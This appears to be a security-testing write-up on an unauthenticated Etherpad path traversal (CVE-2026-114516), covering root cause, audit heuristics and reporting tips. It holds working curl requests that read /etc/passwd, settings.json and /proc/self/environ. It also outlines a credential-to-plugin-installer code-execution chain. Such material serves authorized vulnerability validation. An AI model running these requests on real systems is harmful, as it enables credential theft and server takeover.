---
title: Etherpad /static reads any file pre-auth: post-sanitizer backslash traversal (CVE-2026-114516)
---

# Etherpad /static reads any file pre-auth: post-sanitizer backslash traversal (CVE-2026-114516)

Sources: [GHSA-mc8w-wjhw-45x5](https://github.com/advisories/GHSA-mc8w-wjhw-45x5) / [CVE-2026-114516](https://www.cve.org/CVERecord?id=CVE-2026-114516) (critical 9.8, `ep_etherpad-lite` >= 1.8.14 < 3.3.3, published 2026-11-20T00:23:45Z), [fix PR 8081](https://github.com/ether/etherpad/pull/8081) and [fix commit 9c8d16d](https://github.com/ether/etherpad/commit/9c8d16d50e2fdfd9693ab35c43280410cb4db2fc). Full root cause, code traces, and working PoC ship in the advisory itself.

**Wave in one line:** Etherpad's `/static/plugins/...` handler runs its path through the carefully-written `sanitizePathname` guard and *then* converts backslashes to slashes inside `Minify.ts`, so `..%5C..%5C..%5Cetc/passwd` passes every check and reassembles into a real traversal, on a route registered before the auth middleware, readable by anyone with network access.

!!! warning "Authorized scope only"
    Unauthenticated arbitrary file read with a published admin-credential-to-RCE chain. Validate only against lab Etherpad instances (the Docker image reproduces it in minutes) or customer-owned deployments with written approval. Reads below are limited to process-readable canary files; the plugin-installer RCE leg should be proven only in your own lab.

## Why this is worth an operator page

- **Check-then-normalize order is the whole bug.** `sanitizePathname.ts` converts `\` to `/` *only on Windows*, on purpose: on POSIX `..\..\etc` contains no `..` path segment, so the guard correctly lets it through. `Minify.ts` then unconditionally does `filename.replace(/\\/g, '/')` after the guard ran, with a code comment asserting the opposite invariant ("all `..\` substrings have already been removed by sanitizePathname"). Validation and the sink disagree because a normalization step sits *between* them. Sweep rule for every path/file handler: trace the full string's journey guard-to-`open()`, and flag any separator conversion, URL-decode, percent-decode, Unicode normalization, or case fold that happens **after** validation and could create a `..` segment. Grep fingerprint: `replace(/\\/g,'/')`, `\\` literals, or decode calls in the file-serving/consumer code rather than the sanitizer.
- **Read the sanitizer's own test corpus as an attack corpus.** `src/tests/backend-new/specs/sanitizePathname.ts` lists `['posix', '..\\foo']` among *accepted* paths. When auditing any path guard, pull its unit-test accepted/rejected tables: every deliberately-accepted oddity is a candidate for downstream reinterpretation by a consumer that normalizes later.
- **Route-vs-middleware registration order again, this time via hook systems.** The static route is mounted on the `expressPreSession` hook (`src/ep.json` -> `hooks.aCallAll('expressPreSession')` in `express.ts`), which runs *before* `sessionMiddleware` and `webaccess.checkAccess`. The route answers anonymously no matter how `requireAuthentication`, `requireAuthorization`, or `users` are configured. Generalize the November 17 cloudcmd rule beyond `app.use` ordering: in hook/extension-driven frameworks (Express hook packs, CMS extension registries), enumerate which hook bucket each route registers into and which bucket the auth middleware occupies. A 2xx/4xx-that-is-not-401 on a file route with no cookies is the tell.
- **`%5C` is the proxy-invisible separator.** The advisory is explicit that a reverse proxy does not mitigate: proxies forward `%5C` unchanged, while `%2F` fails because Express 5 / path-to-regexp v8 decodes wildcard params once per segment, the result is re-split on `/`, and the `split('/')[0] === '..'` guard catches it. So exactly one encoding of the traversal separator works, and it is the one that survives middleboxes. Battery for any traversal probe: `../`, `..\`, `..%5C`, `..%2F`, `..%255C`, and mixed spellings, recording which layer decodes how many times; single-decode clients mean double-encoded probes are your layered-decode detector.
- **Root-depth-agnostic traversal via `/proc/self/cwd` and overshoot.** Because `path.join(pluginPath, libraryPath)` produces an absolute path first, `path.resolve(ROOT_DIR, filename)` discards `ROOT_DIR` entirely, and POSIX `path.resolve` collapses surplus `..` at `/`. Consequences: the payload needs no knowledge of the install depth (overshoot the `..` count, extras get absorbed), and `/proc/self/cwd/<file>` reads deployment files without knowing where the app lives. Steal both shapes into your own traversal fuzzing corpus.
- **The read primitive is a credential dispenser; the escalation is already documented.** Read-back targets ranked from the advisory: `settings.json` and `credentials.json` (admin password, sessionKey, DB credentials, SSO client secrets), `/proc/self/environ` (docker-compose deployments carry `ADMIN_PASSWORD` as an env var), TLS private keys, the pad database. Then the chain the vendor PoC prints end-to-end: `POST /admin-auth/` with `Authorization: Basic base64(admin:PASSWORD)` mints an admin `express_sid`; the `/pluginfw/installer` Socket.IO namespace is gated only on `session.user.is_admin`; emitting `install` for an attacker-controlled `ep_*` plugin makes Etherpad `require()` the plugin code in-process. Read -> credential -> installer is the standard Node app full-takeover ladder; enumerate these file names from the deployment fingerprint before probing traversal depth.
- **Long-lived default surface, wide installed base.** The vulnerable route has existed since 1.8.14 (~2018), the core pseudo-plugin `ep_etherpad-lite` (with `package.realPath = <root>/src`) is registered unconditionally so the vulnerable branch is *always* taken, and Etherpad ships in docker-compose stacks, education platforms, and note-taking SaaS backends. External fingerprint: any `/static/plugins/` response class, then one `..%5C` canary against `/etc/passwd` settles it in a single request.

## Replayable validation sequence (lab)

Default production deployment (Docker image or systemd source install, Linux) reproduces everything; no configuration changes required.

1. Pre-auth file read, one request:

   ```bash
   curl --path-as-is \
     'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd'
   ```

   `--path-as-is` stops the client from folding the traversal itself. Extension-less targets return raw bytes with a harmless `Content-Type: false` header (Node coerces the value; it does not throw).
2. Credential canaries (root-agnostic via `/proc/self/cwd`, env-supplied secrets via `/proc/self/environ`):

   ```bash
   curl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/cwd/settings.json'
   curl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/environ'
   ```

3. Escalation leg, lab only: mint the admin session from the recovered password (`POST /admin-auth/` with Basic header), then connect to the `/pluginfw/installer` Socket.IO namespace with the `express_sid` cookie and emit `install` for a stub `ep_*` plugin whose module body writes a marker file; the marker proves in-process execution as the Etherpad user.
4. Negative control: repeat step 1 against 3.3.3 (fixed); the same request must not read outside the served tree.

## Reporting notes

- Frame impact as unauthenticated arbitrary file read of everything the service user can read, including the admin credential store, with a vendor-documented admin-session-to-in-process-code-execution chain; the CVSS 9.8 (AV:N/AC:L/PR:N/UI:N) matches the single-request primitive.
- Include the "reverse proxy does not mitigate, `%5C` traverses" line explicitly; operators commonly close traversal reports on proxy presence.
- Version band is unusually wide (`>= 1.8.14, < 3.3.3`): presence of the `/static/plugins/` handler class plus one canary read is sufficient proof-of-affected; no build fingerprinting needed.
